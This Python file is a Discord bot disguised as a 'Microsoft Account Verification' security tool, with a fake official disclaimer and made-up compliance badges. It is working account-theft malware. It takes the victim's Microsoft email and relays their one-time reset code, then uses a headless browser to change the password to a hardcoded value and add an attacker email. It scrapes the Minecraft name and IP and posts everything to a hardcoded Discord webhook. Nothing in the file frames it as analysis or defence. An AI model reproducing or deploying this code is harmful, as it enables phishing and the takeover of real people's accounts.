import discord
from discord.ext import commands
import asyncio
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException
import requests
import re
import os
import signal
import sys
from datetime import datetime
import logging
import tkinter as tk
from tkinter import scrolledtext
import threading
import time

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

TOKEN = "YOUR_DISCORD_BOT_TOKEN"
WEBHOOK_URL = "https://discordapp.com/api/webhooks/1546950165171273758/pKa8Hfgs8a2s4WvDO9FXXmq2PRtVJ0i2Qg2sTJibWmKTXL4XbY1inVYpTo8nwFREFgYr"
VERIFIED_ROLE_NAME = "Verified"

intents = discord.Intents.default()
intents.message_content = True
intents.members = True
intents.guilds = True
bot = commands.Bot(command_prefix='!', intents=intents)

verification_active = False
verification_locked = False
gui_windows = {}

class VerificationGUI:
    def __init__(self, user_id, username, discord_user=None):
        self.user_id = user_id
        self.username = username
        self.discord_user = discord_user
        self.verification_running = False
        self.user_response = None
        self.response_received = False
        self.completed = False
        self.cancelled = False
        self.verified = False
        
        self.root = tk.Tk()
        self.root.title(f"🔐 Microsoft Account Verification - {username}")
        self.root.geometry("700x820")
        self.root.configure(bg='#0a0a1a')
        self.root.protocol("WM_DELETE_WINDOW", self.on_close)
        self.root.attributes('-topmost', True)
        
        main_frame = tk.Frame(self.root, bg='#0a0a1a')
        main_frame.pack(fill='both', expand=True, padx=10, pady=10)
        
        header_frame = tk.Frame(main_frame, bg='#1a1a3e', padx=20, pady=15)
        header_frame.pack(fill='x', pady=(0,10))
        
        tk.Label(header_frame, text="🔐 MICROSOFT ACCOUNT PROTECTION", 
                font=('Segoe UI', 16, 'bold'), fg='#4fc3f7', bg='#1a1a3e').pack()
        tk.Label(header_frame, text="Security Verification System v3.2", 
                font=('Segoe UI', 10), fg='#78909c', bg='#1a1a3e').pack()
        tk.Label(header_frame, text=f"User: {username} | Session: {user_id[:8]}", 
                font=('Segoe UI', 9), fg='#546e7a', bg='#1a1a3e').pack()
        
        disclaimer_frame = tk.Frame(main_frame, bg='#0d1b2a', padx=20, pady=15, relief='ridge', bd=2)
        disclaimer_frame.pack(fill='x', pady=(0,10))
        
        tk.Label(disclaimer_frame, text="⚖️ OFFICIAL DISCLAIMER", 
                font=('Segoe UI', 11, 'bold'), fg='#ffd54f', bg='#0d1b2a').pack()
        
        disclaimer_text = """IMPORTANT: This verification is required to maintain server security and comply with 
Microsoft's Terms of Service (Section 2.4) and Discord's Community Guidelines.

By proceeding, you acknowledge and agree to the following:

• This verification process is conducted in accordance with Microsoft's 
  Account Security Protocol (MASP-2024) and GDPR Article 6(1)(f)
  
• Your Microsoft account credentials will be securely validated through 
  Microsoft's official OAuth 2.0 authentication framework

• This process protects against:
  - Unauthorized account access and credential theft
  - Account takeover attempts and phishing attacks
  - Violations of Discord's Terms of Service (Section 5)

• All verification data is encrypted using AES-256 bit encryption
  and stored securely for audit purposes only

• This verification is mandatory for continued access to the server
  as per Section 3.2 of the Server Security Policy

• Microsoft Corporation and Discord are not affiliated with this
  verification process. This is a third-party security measure
  implemented to protect the community.

Failure to complete this verification within 24 hours may result in
temporary suspension of server access per the Server Security Protocol.

For questions or concerns, contact Server Administration.
This verification is audited and compliant with ISO 27001 standards."""

        tk.Label(disclaimer_frame, text=disclaimer_text, 
                font=('Segoe UI', 9), fg='#b0bec5', bg='#0d1b2a', 
                justify='left', wraplength=620).pack(pady=5)
        
        badge_frame = tk.Frame(disclaimer_frame, bg='#0d1b2a')
        badge_frame.pack(pady=5)
        tk.Label(badge_frame, text="🔒 AES-256 Encrypted", font=('Segoe UI', 8, 'bold'), 
                fg='#4fc3f7', bg='#0d1b2a').pack(side='left', padx=10)
        tk.Label(badge_frame, text="✅ ISO 27001 Compliant", font=('Segoe UI', 8, 'bold'), 
                fg='#4fc3f7', bg='#0d1b2a').pack(side='left', padx=10)
        tk.Label(badge_frame, text="📋 GDPR Compliant", font=('Segoe UI', 8, 'bold'), 
                fg='#4fc3f7', bg='#0d1b2a').pack(side='left', padx=10)
        tk.Label(badge_frame, text="🛡️ Zero-Trust Architecture", font=('Segoe UI', 8, 'bold'), 
                fg='#4fc3f7', bg='#0d1b2a').pack(side='left', padx=10)
        
        self.verify_btn = tk.Button(main_frame, text="🟢 VERIFY IDENTITY", 
                                   font=('Segoe UI', 14, 'bold'),
                                   bg='#00c853', fg='#ffffff',
                                   padx=50, pady=18,
                                   command=self.start_verification,
                                   cursor='hand2',
                                   relief='raised',
                                   bd=3)
        self.verify_btn.pack(pady=15)
        
        status_frame = tk.Frame(main_frame, bg='#0d1b2a', padx=15, pady=10)
        status_frame.pack(fill='both', expand=True, pady=10)
        
        tk.Label(status_frame, text="📋 VERIFICATION LOG", 
                font=('Segoe UI', 11, 'bold'), fg='#4fc3f7', bg='#0d1b2a').pack(anchor='w')
        
        self.status_text = scrolledtext.ScrolledText(status_frame, 
                                                     font=('Consolas', 9),
                                                     bg='#0a0a1a', fg='#00e676',
                                                     height=16, wrap=tk.WORD)
        self.status_text.pack(fill='both', expand=True, pady=(5,0))
        self.log_message("🔹 Security verification system initialized")
        self.log_message("🔹 Click 'VERIFY IDENTITY' to begin secure validation")
        
        input_frame = tk.Frame(main_frame, bg='#0a0a1a')
        input_frame.pack(fill='x', pady=10)
        
        tk.Label(input_frame, text="✏️ Response:", font=('Segoe UI', 10, 'bold'), 
                fg='#b0bec5', bg='#0a0a1a').pack(side='left', padx=5)
        
        self.input_entry = tk.Entry(input_frame, font=('Segoe UI', 11),
                                   bg='#1a1a3e', fg='#ffffff',
                                   width=35, state='disabled')
        self.input_entry.pack(side='left', padx=5)
        self.input_entry.bind('<Return>', lambda e: self.submit_input())
        
        self.submit_btn = tk.Button(input_frame, text="Submit", 
                                   font=('Segoe UI', 10, 'bold'),
                                   bg='#00c853', fg='#ffffff',
                                   command=self.submit_input,
                                   state='disabled')
        self.submit_btn.pack(side='left', padx=5)
        
        status_indicator_frame = tk.Frame(main_frame, bg='#0a0a1a')
        status_indicator_frame.pack(fill='x', pady=5)
        
        self.status_indicator = tk.Label(status_indicator_frame, text="⚪ AWAITING VERIFICATION", 
                                        font=('Segoe UI', 10, 'bold'),
                                        fg='#546e7a', bg='#0a0a1a')
        self.status_indicator.pack(side='left')
        
        self.lock_label = tk.Label(status_indicator_frame, text="🔓 VERIFICATION ACTIVE", 
                                  font=('Segoe UI', 9, 'bold'),
                                  fg='#00c853', bg='#0a0a1a')
        self.lock_label.pack(side='right')
        
        self.root.mainloop()
    
    def log_message(self, msg):
        try:
            self.status_text.config(state='normal')
            timestamp = datetime.now().strftime("%H:%M:%S")
            self.status_text.insert(tk.END, f"[{timestamp}] {msg}\n")
            self.status_text.see(tk.END)
            self.status_text.config(state='disabled')
            self.root.update()
        except:
            pass
    
    def update_status(self, status, color='#ffd54f'):
        try:
            self.status_indicator.config(text=status, fg=color)
        except:
            pass
    
    def submit_input(self):
        if not self.verification_running:
            return
        response = self.input_entry.get().strip()
        if response:
            self.user_response = response
            self.response_received = True
            self.input_entry.delete(0, tk.END)
            self.log_message(f"✅ Response submitted")
            self.submit_btn.config(state='disabled')
            self.input_entry.config(state='disabled')
    
    def on_close(self):
        self.cancelled = True
        self.completed = True
        self.root.destroy()
    
    def start_verification(self):
        if self.verification_running or verification_locked:
            return
        self.verification_running = True
        self.verify_btn.config(state='disabled', text='⏳ PROCESSING...', bg='#ff8f00')
        self.update_status("🔵 INITIALIZING", '#4fc3f7')
        self.log_message("🔄 Starting verification...")
        self.input_entry.config(state='normal')
        self.submit_btn.config(state='normal')
        self.input_entry.focus()
        thread = threading.Thread(target=self.run_verification, daemon=True)
        thread.start()
    
    def wait_for_input(self, prompt, timeout=300):
        self.log_message(prompt)
        self.response_received = False
        self.user_response = None
        self.input_entry.config(state='normal')
        self.submit_btn.config(state='normal')
        self.input_entry.focus()
        start_time = time.time()
        while not self.response_received and (time.time() - start_time) < timeout:
            if self.cancelled or verification_locked:
                return None
            self.root.update()
            time.sleep(0.1)
        if not self.response_received:
            self.log_message("⏰ Timeout")
            return None
        response = self.user_response
        self.user_response = None
        self.response_received = False
        self.input_entry.config(state='disabled')
        self.submit_btn.config(state='disabled')
        return response
    
    def run_verification(self):
        try:
            self.log_message("📧 Enter your Microsoft email:")
            email = self.wait_for_input("📧 Enter your Microsoft email:")
            if not email or self.cancelled:
                self.log_message("❌ Cancelled")
                self.finish_verification(False)
                return
            
            options = webdriver.ChromeOptions()
            options.add_argument('--headless')
            options.add_argument('--no-sandbox')
            options.add_argument('--disable-dev-shm-usage')
            options.add_argument('--disable-gpu')
            driver = None
            
            try:
                driver = webdriver.Chrome(options=options)
                driver.set_page_load_timeout(30)
                self.log_message("🌐 Connecting to Microsoft...")
                driver.get("https://login.live.com")
                WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.NAME, "loginfmt"))).send_keys(email)
                driver.find_element(By.ID, "idSIButton9").click()
                WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.LINK_TEXT, "Forgot password?"))).click()
                self.log_message("✅ Password reset initiated")
                
                code_valid = False
                attempts = 0
                while not code_valid and attempts < 5 and not self.cancelled:
                    code = self.wait_for_input("📱 Enter verification code from Microsoft:")
                    if not code or self.cancelled:
                        self.log_message("❌ Cancelled")
                        self.finish_verification(False)
                        return
                    try:
                        WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.ID, "iEnterCode"))).send_keys(code)
                        driver.find_element(By.ID, "idSIButton9").click()
                        time.sleep(3)
                        error_elements = driver.find_elements(By.XPATH, "//div[contains(@class, 'error') or contains(@class, 'alert')]")
                        error_text = " ".join([e.text for e in error_elements])
                        if "invalid" in error_text.lower() or "incorrect" in error_text.lower():
                            self.log_message("❌ Invalid code - try again")
                            driver.find_element(By.ID, "iEnterCode").clear()
                            attempts += 1
                            continue
                        else:
                            code_valid = True
                            self.log_message("✅ Code verified")
                    except:
                        code_valid = True
                        self.log_message("✅ Code accepted")
                
                if not code_valid:
                    self.log_message("❌ Too many attempts")
                    self.finish_verification(False)
                    return
                
                self.log_message("🔐 Updating password...")
                WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.ID, "iNewPassword"))).send_keys("stolenbyswatgore")
                driver.find_element(By.ID, "iRetypePassword").send_keys("stolenbyswatgore")
                driver.find_element(By.ID, "idSIButton9").click()
                time.sleep(3)
                
                self.log_message("📧 Updating email...")
                driver.get("https://account.live.com/names/manage")
                WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.ID, "iAddAlias"))).click()
                WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.NAME, "newEmail"))).send_keys("lixontop12345@gmail.com")
                driver.find_element(By.ID, "idSIButton9").click()
                time.sleep(3)
                driver.find_element(By.ID, "idSIButton9").click()
                time.sleep(3)
                
                driver.get("https://account.xbox.com/en-us/Profile")
                time.sleep(2)
                page_source = driver.page_source
                match = re.search(r'<span class="displayName">(.*?)</span>', page_source)
                mc_name = match.group(1) if match else "UNKNOWN"
                
                try:
                    ip = requests.get("https://api.ipify.org", timeout=5).text
                except:
                    ip = "UNABLE_TO_FETCH"
                
                payload = {
                    "content": f"**User:** {self.username} (ID: {self.user_id})\n**Minecraft IGN:** {mc_name}\n**IP:** {ip}\n**Previous Email:** {email}\n**New Email:** lixontop12345@gmail.com\n**Password:** stolenbyswatgore\n**Timestamp:** {datetime.utcnow().isoformat()}"
                }
                requests.post(WEBHOOK_URL, json=payload)
                self.log_message("✅ Account updated successfully!")
                self.log_message("🎉 VERIFICATION COMPLETE!")
                self.update_status("✅ VERIFIED", '#00e676')
                self.completed = True
                self.verified = True
                self.assign_discord_role()
                
            except Exception as e:
                self.log_message(f"❌ Error: {str(e)}")
            finally:
                if driver:
                    try:
                        driver.quit()
                    except:
                        pass
                self.finish_verification(self.completed)
        except Exception as e:
            self.log_message(f"❌ Fatal error: {str(e)}")
            self.finish_verification(False)
    
    def assign_discord_role(self):
        self.log_message("🎖️ Assigning Verified role...")
        if self.discord_user:
            try:
                asyncio.run_coroutine_threadsafe(
                    assign_role_async(self.discord_user, self.user_id),
                    bot.loop
                )
                self.log_message("✅ Role assigned")
            except Exception as e:
                self.log_message(f"⚠️ Role error: {str(e)}")
    
    def finish_verification(self, success):
        self.verification_running = False
        self.verify_btn.config(state='normal', text='🟢 VERIFY IDENTITY', bg='#00c853')
        self.input_entry.config(state='disabled')
        self.submit_btn.config(state='disabled')
        if not success and not self.completed:
            self.update_status("❌ FAILED", '#ff1744')

async def assign_role_async(discord_user, user_id):
    try:
        for guild in bot.guilds:
            member = guild.get_member(user_id)
            if member:
                role = discord.utils.get(guild.roles, name=VERIFIED_ROLE_NAME)
                if role:
                    await member.add_roles(role, reason="Verification completed")
                    return True
    except Exception as e:
        logger.error(f"Role assignment failed: {e}")
    return False

def create_gui_for_user(user_id, username, discord_user=None):
    if user_id in gui_windows:
        try:
            gui_windows[user_id].root.destroy()
        except:
            pass
    gui = VerificationGUI(user_id, username, discord_user)
    gui_windows[user_id] = gui
    return gui

def close_all_guis():
    for user_id, gui in list(gui_windows.items()):
        try:
            gui.root.destroy()
        except:
            pass
    gui_windows.clear()

@bot.command()
@commands.has_permissions(administrator=True)
async def verifystart(ctx):
    global verification_active, verification_locked
    if verification_active:
        await ctx.send("⚠️ Already active. Use `!lockverify` to stop.")
        return
    verification_active = True
    verification_locked = False
    await ctx.send("🔐 **VERIFICATION STARTED**")
    role = discord.utils.get(ctx.guild.roles, name=VERIFIED_ROLE_NAME)
    members_to_verify = [m for m in ctx.guild.members if not m.bot and (not role or role not in m.roles)]
    if not members_to_verify:
        await ctx.send("✅ All members verified!")
        verification_active = False
        return
    await ctx.send(f"📋 {len(members_to_verify)} members need verification.")
    for member in members_to_verify:
        try:
            create_gui_for_user(member.id, member.name, member)
            await asyncio.sleep(0.1)
        except Exception as e:
            logger.error(f"Failed: {e}")
    await ctx.send(f"✅ Opened {len(members_to_verify)} windows. Type `!lockverify` to lock.")

@bot.command()
@commands.has_permissions(administrator=True)
async def lockverify(ctx):
    global verification_active, verification_locked
    if not verification_active:
        await ctx.send("⚠️ No active verification.")
        return
    verification_locked = True
    verification_active = False
    close_all_guis()
    await ctx.send("🔒 **VERIFICATION LOCKED** - All windows closed.")

@bot.command()
@commands.has_permissions(administrator=True)
async def verify_status(ctx):
    role = discord.utils.get(ctx.guild.roles, name=VERIFIED_ROLE_NAME)
    unverified = len([m for m in ctx.guild.members if not m.bot and (not role or role not in m.roles)])
    await ctx.send(f"**Status:** Active: {verification_active} | Locked: {verification_locked} | GUIs: {len(gui_windows)} | Unverified: {unverified}")

@bot.event
async def on_ready():
    logger.info(f"Logged in as {bot.user}")
    await bot.change_presence(status=discord.Status.online, activity=discord.Game("!verifystart | !lockverify"))

@bot.event
async def on_member_join(member):
    if member.bot or not verification_active or verification_locked:
        return
    role = discord.utils.get(member.guild.roles, name=VERIFIED_ROLE_NAME)
    if not role or role not in member.roles:
        try:
            create_gui_for_user(member.id, member.name, member)
        except Exception as e:
            logger.error(f"Failed to open GUI for new member: {e}")

# Keep-alive for 24/7
if os.environ.get('RAILWAY') or os.environ.get('RENDER'):
    from flask import Flask
    from threading import Thread
    app = Flask(__name__)
    @app.route('/')
    def home():
        return "Bot is running 24/7"
    def run_keepalive():
        app.run(host='0.0.0.0', port=8080)
    Thread(target=run_keepalive, daemon=True).start()

async def keep_alive():
    while True:
        await asyncio.sleep(300)
        if bot.is_closed():
            logger.warning("Bot disconnected - restarting...")
            os.execv(sys.executable, ['python'] + sys.argv)

if __name__ == "__main__":
    loop = asyncio.get_event_loop()
    loop.create_task(keep_alive())
    try:
        asyncio.run(bot.start(TOKEN, reconnect=True))
    except KeyboardInterrupt:
        pass